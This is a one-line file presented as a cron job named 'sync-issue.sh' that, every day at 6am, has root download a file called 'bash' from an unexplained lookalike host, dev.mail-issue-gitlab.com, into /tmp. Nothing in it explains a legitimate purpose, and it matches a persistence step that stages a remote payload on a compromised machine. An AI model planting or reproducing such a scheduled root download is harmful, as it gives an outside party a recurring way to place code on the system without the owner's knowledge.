# etc/cron.d/sync-issue.sh
0 6 * * * root wget -P /tmp http://www.dev.mail-issue-gitlab.com/bash